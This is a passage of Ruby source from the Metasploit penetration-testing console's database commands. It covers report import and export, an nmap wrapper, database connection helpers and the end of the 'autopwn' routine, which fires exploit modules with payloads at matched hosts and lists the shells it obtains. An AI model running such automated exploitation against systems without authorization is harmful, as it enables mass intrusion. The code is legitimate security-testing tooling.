									inp = (mode & PWN_SLNT != 0) ? nil : driver.input
									out = (mode & PWN_SLNT != 0) ? nil : driver.output

									case xmod.type
									when MODULE_EXPLOIT
										xmod.exploit_simple(
											'Payload'        => xmod.datastore['PAYLOAD'],
											'LocalInput'     => inp,
											'LocalOutput'    => out,
											'RunAsJob'       => false)
									when MODULE_AUX
										xmod.run_simple(
											'LocalInput'     => inp,
											'LocalOutput'    => out,
											'RunAsJob'       => false)
									end
								end

							rescue ::Timeout::Error
								print_status(" >> autopwn module timeout from #{xmod.fullname} after #{Time.now.to_f - stime} seconds")
							rescue ::Exception
								print_status(" >> autopwn exception during launch from #{xmod.fullname}: #{$!} ")
							end
						end
					end

				rescue ::Interrupt
					raise $!

				rescue ::Exception
					print_status(" >> autopwn exception from #{xref[3]}: #{$!} #{$!.backtrace}")
				end
			end

			# Wait on all the jobs we just spawned
			while (not autopwn_jobs.empty?)
				# All running jobs are stored in framework.jobs.  If it's
				# not in this list, it must have completed.
				autopwn_jobs.delete_if { |j| not j.alive? }

				print_status("(#{matches.length}/#{matches.length} [#{framework.sessions.length} sessions]): Waiting on #{autopwn_jobs.length} launched modules to finish execution...")
				::IO.select(nil, nil, nil, 5.0)
			end

			if (mode & PWN_SHOW != 0 and mode & PWN_EXPL != 0)
				print_status("The autopwn command has completed with #{framework.sessions.length} sessions")
				if(framework.sessions.length > 0)
					print_status("Enter sessions -i [ID] to interact with a given session ID")
					print_status("")
					print_status("=" * 80)
					driver.run_single("sessions -l -v")
					print_status("=" * 80)
				end
			end
			print_line("")
		# EOM
		end

		#
		# Determine if an IP address is inside a given range
		#
		def range_include?(ranges, addr)
			ranges.each do |range|
				return true if range.include? addr
			end
			false
		end

		def cmd_db_import_tabs(str, words)
			tab_complete_filenames(str, words)
		end

		def cmd_db_import_help
			print_line "Usage: db_import <filename> [file2...]"
			print_line
			print_line "Filenames can be globs like *.xml, or **/*.xml which will search recursively"
			print_line "Currently supported file types include:"
			print_line "    Acunetix XML"
			print_line "    Amap Log"
			print_line "    Amap Log -m"
			print_line "    Appscan XML"
			print_line "    Burp Session XML"
			print_line "    Foundstone XML"
			print_line "    IP360 ASPL"
			print_line "    IP360 XML v3"
			print_line "    Microsoft Baseline Security Analyzer"
			print_line "    Nessus NBE"
			print_line "    Nessus XML (v1 and v2)"
			print_line "    NetSparker XML"
			print_line "    NeXpose Simple XML"
			print_line "    NeXpose XML Report"
			print_line "    Nmap XML"
			print_line "    OpenVAS Report"
			print_line "    Qualys Asset XML"
			print_line "    Qualys Scan XML"
			print_line "    Retina XML"
			print_line
		end

		#
		# Generic import that automatically detects the file type
		#
		def cmd_db_import(*args)
			return unless active?
			if (args.include?("-h") or not (args and args.length > 0))
				cmd_db_import_help
				return
			end
			args.each { |glob|
				files = Dir.glob(File.expand_path(glob))
				if files.empty?
					print_error("No such file #{glob}")
					next
				end
				files.each { |filename|
					if (not File.readable?(filename))
						print_error("Could not read file #{filename}")
						next
					end
					begin
						warnings = 0
						framework.db.import_file(:filename => filename) do |type,data|
							case type
							when :debug
								print_error("DEBUG: #{data.inspect}")
							when :vuln
								inst = data[1] == 1 ? "instance" : "instances"
								print_status("Importing vulnerability '#{data[0]}' (#{data[1]} #{inst})")
							when :filetype
								print_status("Importing '#{data}' data")
							when :parser
								print_status("Import: Parsing with '#{data}'")
							when :address
								print_status("Importing host #{data}")
							when :service
								print_status("Importing service #{data}")
							when :msf_loot
								print_status("Importing loot #{data}")
							when :msf_task
								print_status("Importing task #{data}")
							when :msf_report
								print_status("Importing report #{data}")
							when :pcap_count
								print_status("Import: #{data} packets processed")
							when :record_count
								print_status("Import: #{data[1]} records processed")
							when :warning
								print_error("")
								data.split("\n").each do |line|
									print_error(line)
								end
								print_error("")
								warnings += 1
							end
						end
						print_status("Successfully imported #{filename}")

						print_error("Please note that there were #{warnings} warnings") if warnings > 1
						print_error("Please note that there was one warning") if warnings == 1

					rescue DBImportError
						print_error("Failed to import #{filename}: #{$!}")
						elog("Failed to import #{filename}: #{$!.class}: #{$!}")
						dlog("Call stack: #{$@.join("\n")}", LEV_3)
						next
					rescue REXML::ParseException => e
						print_error("Failed to import #{filename} due to malformed XML:")
						print_error "#{$!.class}: #{$!}"
						elog("Failed to import #{filename}: #{$!.class}: #{$!}")
						dlog("Call stack: #{$@.join("\n")}", LEV_3)
						next
					end
				}
			}
		end

		def cmd_db_export_help
			# Like db_hosts and db_services, this creates a list of columns, so
			# use its -h
			cmd_db_export("-h")
		end

		#
		# Export an XML
		#
		def cmd_db_export(*args)
			return unless active?

			export_formats = %W{xml pwdump}
			format = 'xml'
			output = nil

			while (arg = args.shift)
				case arg
				when '-h','--help'
					print_line("Usage:")
					print_line("    db_export -f <format> [-a] [filename]")
					print_line("    Format can be one of: #{export_formats.join(", ")}")
				when '-f','--format'
					format = args.shift.to_s.downcase
				else
					output = arg
				end
			end

			if not output
				print_error("No output file was specified")
				return
			end

			if not export_formats.include?(format)
				print_error("Unsupported file format: #{format}")
				print_error("Unsupported file format: '#{format}'. Must be one of: #{export_formats.join(", ")}")
				return
			end

			print_status("Starting export of workspace #{framework.db.workspace.name} to #{output} [ #{format} ]...")
			exporter = Msf::DBManager::Export.new(framework.db.workspace)

			exporter.send("to_#{format}_file".intern,output) do |mtype, mstatus, mname|
				if mtype == :status
					if mstatus == "start"
						print_status("    >> Starting export of #{mname}")
					end
					if mstatus == "complete"
						print_status("    >> Finished export of #{mname}")
					end
				end
			end
			print_status("Finished export of workspace #{framework.db.workspace.name} to #{output} [ #{format} ]...")
		end

		#
		# Import Nmap data from a file
		#
		def cmd_db_nmap(*args)
			return unless active?
			if (args.length == 0)
				print_status("Usage: db_nmap [nmap options]")
				return
			end

			nmap =
				Rex::FileUtils.find_full_path("nmap") ||
				Rex::FileUtils.find_full_path("nmap.exe")

			if (not nmap)
				print_error("The nmap executable could not be found")
				return
			end

			fd = Tempfile.new('dbnmap')
			fd.binmode

			fo = Tempfile.new('dbnmap')
			fo.binmode

			# When executing native Nmap in Cygwin, expand the Cygwin path to a Win32 path
			if(Rex::Compat.is_cygwin and nmap =~ /cygdrive/)
				# Custom function needed because cygpath breaks on 8.3 dirs
				tout = Rex::Compat.cygwin_to_win32(fd.path)
				fout = Rex::Compat.cygwin_to_win32(fo.path)
				args.push('-oX', tout)
				args.push('-oN', fout)
			else
				args.push('-oX', fd.path)
				args.push('-oN', fo.path)
			end

			begin
				nmap_pipe = ::Open3::popen3([nmap, "nmap"], *args)
				temp_nmap_threads = []
				temp_nmap_threads << framework.threads.spawn("db_nmap-Stdout", false, nmap_pipe[1]) do |np_1|
					np_1.each_line do |nmap_out|
						next if nmap_out.strip.empty?
						print_status "Nmap: #{nmap_out.strip}"
					end
				end

				temp_nmap_threads << framework.threads.spawn("db_nmap-Stderr", false, nmap_pipe[2]) do |np_2|
					np_2.each_line do |nmap_err|
						next if nmap_err.strip.empty?
						print_status  "Nmap: '#{nmap_err.strip}'"
					end
				end

				temp_nmap_threads.map {|t| t.join rescue nil}
				nmap_pipe.each {|p| p.close rescue nil}
			rescue ::IOError
			end

			fo.close(true)
			framework.db.import_nmap_xml_file(:filename => fd.path)
			fd.close(true)
		end

		#
		# Database management
		#

		def db_check_driver
			if(not framework.db.driver)
				print_error("No database driver has been specified")
				return false
			end
			true
		end

		#
		# Is everything working?
		#
		def cmd_db_status(*args)
			if framework.db.driver
				if ActiveRecord::Base.connected? and ActiveRecord::Base.connection.active?
					if ActiveRecord::Base.connection.respond_to? :current_database
						cdb = ActiveRecord::Base.connection.current_database
					end
					print_status("#{framework.db.driver} connected to #{cdb}")
				else
					print_status("#{framework.db.driver} selected, no connection")
				end
			else
				print_status("No driver selected")
			end
		end

		def cmd_db_driver(*args)

			if(args[0])
				if(args[0] == "-h" || args[0] == "--help")
					print_status("Usage: db_driver [driver-name]")
					return
				end

				if(framework.db.drivers.include?(args[0]))
					framework.db.driver = args[0]
					print_status("Using database driver #{args[0]}")
				else
					print_error("Invalid driver specified")
				end
				return
			end

			if(framework.db.driver)
				print_status("   Active Driver: #{framework.db.driver}")
			else
				print_status("No Active Driver")
			end
			print_status("       Available: #{framework.db.drivers.join(", ")}")
			print_line("")

			if ! framework.db.drivers.include?('mysql')
				print_status("    DB Support: Enable the mysql driver with the following command:")
				print_status("                $ gem install mysql")
				print_status("    This gem requires mysqlclient headers, which can be installed on Ubuntu with:")
				print_status("                $ sudo apt-get install libmysqlclient-dev")
				print_line("")
			end

			if ! framework.db.drivers.include?('postgresql')
				print_status("    DB Support: Enable the postgresql driver with the following command:")
				print_status("                  * This requires libpq-dev and a build environment")
				print_status("                $ gem install postgres")
				print_status("                $ gem install pg # is an alternative that may work")
				print_line("")
			end
		end

		def cmd_db_driver_tabs(str, words)
			return framework.db.drivers
		end

		def cmd_db_connect_help
			# Help is specific to each driver
			cmd_db_connect("-h")
		end

		def cmd_db_connect(*args)
			return if not db_check_driver
			if (args[0] == "-y")
				if (args[1] and not File.exists? File.expand_path(args[1]))
					print_error("File not found")
					return
				end
				file = args[1] || File.join(Msf::Config.get_config_root, "database.yml")
				if (File.exists? File.expand_path(file))
					db = YAML.load(File.read(file))['production']
					cmd_db_driver(db['adapter'])
					framework.db.connect(db)
					return
				end
			end
			meth = "db_connect_#{framework.db.driver}"
			if(self.respond_to?(meth))
				self.send(meth, *args)
			else
				print_error("This database driver #{framework.db.driver} is not currently supported")
			end
		end

		def cmd_db_disconnect_help
			print_line "Usage: db_disconnect"
			print_line
			print_line "Disconnect from the database."
			print_line
		end

		def cmd_db_disconnect(*args)
			return if not db_check_driver

			if(args[0] and (args[0] == "-h" || args[0] == "--help"))
				cmd_db_disconnect_help
				return
			end

			if (framework.db)
				framework.db.disconnect()
			end
		end


		#
		# Set RHOSTS in the +active_module+'s (or global if none) datastore from an array of addresses
		#
		# This stores all the addresses to a temporary file and utilizes the
		# <pre>file:/tmp/filename</pre> syntax to confer the addrs.  +rhosts+
		# should be an Array.  NOTE: the temporary file is *not* deleted
		# automatically.
		#
		def set_rhosts_from_addrs(rhosts)
			if rhosts.empty?
				print_status "The list is empty, cowardly refusing to set RHOSTS"
				return
			end
			if active_module
				mydatastore = active_module.datastore
			else
				# if there is no module in use set the list to the global variable
				mydatastore = self.framework.datastore
			end

			if rhosts.length > 5
				# Lots of hosts makes 'show options' wrap which is difficult to
				# read, store to a temp file
				rhosts_file = Rex::Quickfile.new("msf-db-rhosts-")
				mydatastore['RHOSTS'] = 'file:'+rhosts_file.path
				# create the output file and assign it to the RHOSTS variable
				rhosts_file.write(rhosts.join("\n")+"\n")
				rhosts_file.close
			else
				# For short lists, just set it directly
				mydatastore['RHOSTS'] = rhosts.join(" ")
			end

			print_line "RHOSTS => #{mydatastore['RHOSTS']}"
			print_line
		end


		def db_find_tools(tools)
			found   = true
			missed  = []
			tools.each do |name|
				if(! Rex::FileUtils.find_full_path(name))
					missed << name
				end
			end
			if(not missed.empty?)
				print_error("This database command requires the following tools to be installed: #{missed.join(", ")}")
				return
			end
			true
		end


		#
		# Database management: MySQL
		#

		#
		# Connect to an existing MySQL database
		#
		def db_connect_mysql(*args)
			if(args[0] == nil or args[0] == "-h" or args[0] == "--help")
				print_status("   Usage: db_connect <user:pass>@<host:port>/<database>")
				print_status("      OR: db_connect -y [path/to/database.yml]")
				print_status("Examples:")
				print_status("       db_connect user@metasploit3")
				print_status("       db_connect user:pass@192.168.0.2/metasploit3")
				print_status("       db_connect user:pass@192.168.0.2:1500/metasploit3")
				return
			end

			info = db_parse_db_uri_mysql(args[0])
			opts = { 'adapter' => 'mysql' }

			opts['username'] = info[:user] if (info[:user])
			opts['password'] = info[:pass] if (info[:pass])
			opts['database'] = info[:name]
			opts['host'] = info[:host] if (info[:host])
			opts['port'] = info[:port] if (info[:port])

			opts['host'] ||= 'localhost'

			# This is an ugly hack for a broken MySQL adapter:
			# 	http://dev.rubyonrails.org/ticket/3338
			if (opts['host'].strip.downcase == 'localhost')
				opts['host'] = Socket.gethostbyname("localhost")[3].unpack("C*").join(".")
			end

			if (not framework.db.connect(opts))
				raise RuntimeError.new("Failed to connect to the database: #{framework.db.error}")
			end
		end

		def db_parse_db_uri_mysql(path)
			res = {}
			if (path)
				auth, dest = path.split('@')
				(dest = auth and auth = nil) if not dest
				res[:user],res[:pass] = auth.split(':') if auth
				targ,name = dest.split('/')
				(name = targ and targ = nil) if not name
				res[:host],res[:port] = targ.split(':') if targ
			end
			res[:name] = name || 'metasploit3'
			res
		end


		#
		# Database management: Postgres
		#

		#
		# Connect to an existing Postgres database
		#
		def db_connect_postgresql(*args)
			if(args[0] == nil or args[0] == "-h" or args[0] == "--help")
				print_status("   Usage: db_connect <user:pass>@<host:port>/<database>")
				print_status("      OR: db_connect -y [path/to/database.yml]")
				print_status("Examples:")
				print_status("       db_connect user@metasploit3")
				print_status("       db_connect user:pass@192.168.0.2/metasploit3")
				print_status("       db_connect user:pass@192.168.0.2:1500/metasploit3")
				return
			end

			info = db_parse_db_uri_postgresql(args[0])
			opts = { 'adapter' => 'postgresql' }

			opts['username'] = info[:user] if (info[:user])
			opts['password'] = info[:pass] if (info[:pass])
			opts['database'] = info[:name]
			opts['host'] = info[:host] if (info[:host])
			opts['port'] = info[:port] if (info[:port])

			opts['pass'] ||= ''

			# Do a little legwork to find the real database socket
			if(! opts['host'])
				while(true)
					done = false
					dirs = %W{ /var/run/postgresql /tmp }
					dirs.each do |dir|
						if(::File.directory?(dir))
							d = ::Dir.new(dir)
							d.entries.grep(/^\.s\.PGSQL.(\d+)$/).each do |ent|
								opts['port'] = ent.split('.')[-1].to_i
								opts['host'] = dir
								done = true
								break
							end
						end
						break if done
					end
					break
				end
			end

			# Default to loopback
			if(! opts['host'])
				opts['host'] = '127.0.0.1'
			end

			if (not framework.db.connect(opts))
				raise RuntimeError.new("Failed to connect to the database: #{framework.db.error}")
			end
		end

		def db_parse_db_uri_postgresql(path)
			res = {}
			if (path)
				auth, dest = path.split('@')
				(dest = auth and auth = nil) if not dest
				res[:user],res[:pass] = auth.split(':') if auth
				targ,name = dest.split('/')
				(name = targ and targ = nil) if not name
				res[:host],res[:port] = targ.split(':') if targ
			end
			res[:name] = name || 'metasploit3'
			res
		end


		##
		# Miscellaneous option helpers
		##

		#
		# Parse +arg+ into a RangeWalker and append the result into +host_ranges+
		#
		# Returns true if parsing was successful or nil otherwise.
		#
		# NOTE: This modifies +host_ranges+
		#
		def arg_host_range(arg, host_ranges, required=false)
			if (!arg and required)
				print_error("Missing required host argument")
				return
			end
			begin
				host_ranges << Rex::Socket::RangeWalker.new(arg)
			rescue
				print_error "Invalid host parameter, #{arg}."
				return
			end
			return true
		end

		#
		# Parse +arg+ into an array of ports and append the result into +port_ranges+
		#
		# Returns true if parsing was successful or nil otherwise.
		#
		# NOTE: This modifies +port_ranges+
		#
		def arg_port_range(arg, port_ranges, required=false)
			if (!arg and required)
				print_error("Argument required for -p")
				return
			end
			begin
				port_ranges << Rex::Socket.portspec_to_portlist(arg)
			rescue
				print_error "Invalid port parameter, #{arg}."
				return
			end
			return true
		end

		#
		# Takes +host_ranges+, an Array of RangeWalkers, and chunks it up into
		# blocks of 1024.
		#
		def each_host_range_chunk(host_ranges, &block)
			# Chunk it up and do the query in batches. The naive implementation
			# uses so much memory for a /8 that it's basically unusable (1.6
			# billion IP addresses take a rather long time to allocate).
			# Chunking has roughly the same perfomance for small batches, so
			# don't worry about it too much.
			host_ranges.each do |range|
				if range.nil? or range.length.nil?
					chunk = nil
					end_of_range = true
				else
					chunk = []
					end_of_range = false
					# Set up this chunk of hosts to search for
					while chunk.length < 1024 and chunk.length < range.length
						n = range.next_ip
						if n.nil?
							end_of_range = true
							break
						end
						chunk << n
					end
				end

				# The block will do some
				yield chunk

				# Restart the loop with the same RangeWalker if we didn't get
				# to the end of it in this chunk.
				redo unless end_of_range
			end
		end

end
end
end
end
end

